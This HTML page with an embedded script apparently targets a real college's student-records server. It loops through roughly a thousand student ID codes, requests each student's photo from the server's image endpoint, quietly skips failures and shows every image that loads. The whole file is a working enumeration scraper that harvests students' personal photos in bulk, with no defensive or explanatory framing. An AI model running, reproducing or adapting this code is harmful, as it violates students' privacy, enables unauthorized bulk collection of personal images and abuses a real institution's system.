<!DOCTYPE html>
<html>
<head>
    <title>Student Photos</title>
</head>
<body>

<h2>Satyam Inc</h2>

<script>
    let start = 19000;
    let end = 20000;

    for (let id = start; id <= end; id++) {

        let img = new Image();

        img.src = "https://abesit.servergi.com:8077/ISIMABESIT/Services/getImage.ashx?Category=Student&MasterId=19450&ImageRefName=Photo&IdCode=" 
                  + id +
                  "&height=120&width=100";

        img.style.marginBottom = "10px";

        // Only append if image loads successfully
        img.onload = function () {
            document.body.appendChild(img);
        };

        // If image fails → skip silently
        img.onerror = function () {
            // Do nothing
        };
    }
</script>

</body>
</html>
